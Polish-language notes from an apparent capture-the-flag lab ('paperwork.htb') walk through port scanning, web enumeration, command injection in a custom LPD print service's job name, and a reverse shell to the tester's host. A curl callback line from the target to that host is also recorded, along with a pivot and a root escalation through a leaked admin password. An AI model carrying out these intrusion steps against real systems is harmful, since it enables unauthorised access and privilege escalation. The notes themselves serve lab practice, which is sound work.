# Paperwork — notatki

## Target
- IP: `10.129.41.199` (reset 2026-07-12)
- Host: `paperwork.htb`
- VPN: Release Arena EU

## 2026-07-12 — działa po VPN `release_arena_eu-release-1(1).ovpn`
- IP: `10.129.41.146`
- **22/tcp** OpenSSH 10.0p2 Ubuntu
- **80/tcp** **nginx 1.28.0** (Ubuntu)
- 443/8080/… — closed (reset)
- Pełny skan: `nmap/initial.*`

## Enumeracja WWW / OWASP (2026-07-12)
- **Stack:** nginx **1.28.0** (Ubuntu) — tylko reverse/static HTTP; aplikacja biznesowa ≠ PHP/Apache.
- Ścieżki: `/` (Intake Portal), **`/download/archive`** → ZIP `paperwork-archive-v1.02.zip` → `server.py` (LPD).
- **1515/tcp** — LPD (`Archive_Printer is ready and printing.`).
- **XSS:** `?x=`, `?search=` — brak refleksji (statyczny HTML); archive zwraca ZIP.
- **Nagłówki:** brak CSP/HSTS/X-Frame-Options na `/` (misconfig / info).
- **Subdomeny:** ~2500 Hostów → wszystkie `301` na apex; **brak** osobnego vhostu z panelem.
- **Panel logowania WWW:** **nie znaleziony** (`/login`, raft-medium — 404); strona mówi że **console offline**. Flask pod `/download/` tylko **`archive`** (ZIP).
- **edu:** `edu/01`–`07`.

## Foothold (LPD)
- **MSF:** brak modułu pod custom LPD; `search lpd` = stare OS, nie Paperwork.
- **PoC:** `scripts/lpd_exploit.py` — kolejka `archive_intake`, subcmd `\x02`, injekcja w `J` / `job_name`.
- **Shell:** `lp@paperwork` (rev `10.10.17.138:4444`), cwd `/opt/LPDServer`.
- Callback potwierdzony: `curl http://10.10.17.138:8888/lpd-ok2` z targetu.

## Pivot lp → archivist / _laurel (enum 2026-07-12)
- **Brak `.env`** na maszynie.
- **`_laurel`**: daemon audit (laurel), nie login — `/etc/laurel/config.toml` czytelny dla `lp`.
- **User docelowy:** `archivist` (uid 1000) — `/home/archivist` zamknięte dla `lp`.
- **Usługi:** `127.0.0.1:1337` CorpoSite (nginx), `:9100` jetdirect (archivist), `mgmt.sock` (grupa archivist).
- **Leak:** `/usr/bin/paperwork-daemon` world-readable → FD `admin_pins.conf` przy triggerze FS* w `commands.log`.
- Log: `loot/lpd-callback.log`, edu: `edu/08-lp-to-archivist-chain.md`.

## Root (2026-07-12, 10.129.41.199)
- Po leaku `ADMIN_PASSWORD` z `mgmt.sock` (trigger FS* → `mgmt_leak_admin.py`): **`su root`** tym samym hasłem → `/root/root.txt`.
- Flagi: `loot/copy-paste.txt`.